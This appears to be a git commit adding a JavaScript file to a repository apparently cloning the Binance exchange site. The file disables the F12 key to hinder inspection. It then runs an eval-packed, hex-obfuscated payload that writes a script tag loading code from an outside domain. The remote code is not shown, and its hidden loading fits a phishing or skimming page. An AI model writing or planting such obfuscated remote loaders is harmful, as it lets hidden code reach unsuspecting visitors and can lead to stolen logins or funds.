1878647ffbebf93aee362588205d027297fa78ad
ibinance <129523774+ibinance@users.noreply.github.com>
2023-03-31 22:09:55 +0800

    Create com.js

---
+++ bian/js/com.js
@@ -0,0 +1,9 @@
+document.onkeydown = function (e) {
+var currentKey = 0, k = e || window.event;
+currentKey = k.keyCode || k.which || k.charCode;
+if (currentKey == 123) {
+window.event.cancelBubble = true;
+window.event.returnValue = false;
+}}
+
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('2 d="\\a";2 0="s\\y\\1\\n\\m\\l\\q\\p",e="\\o\\k\\h\\j\\i\\g\\4\\5\\1\\r\\A\\z//\\3\\3\\3\\6\\B\\D\\6\\7\\5\\9",c="\\8\\4\\7\\C\\6\\9\\u\\t\\b\\a\\8\\v\\4\\5\\1";2 f="\\b";0=0+e+c;s=d+0+f;x.w(s);',40,40,'s2|x69pt|var|x77|x63|x72|x2e|x6f|x2f|x67|x3c|x3e|s4|s1|s3|s5|x76as|x2F|x61|x6A|x74|x70|x79|x20t|x74ex|x3D|x65|x20s||x66|x69|x73|write|document|x63r|x3d|x72c|x6a|x6d|x6a5'.split('|'),0,{}));
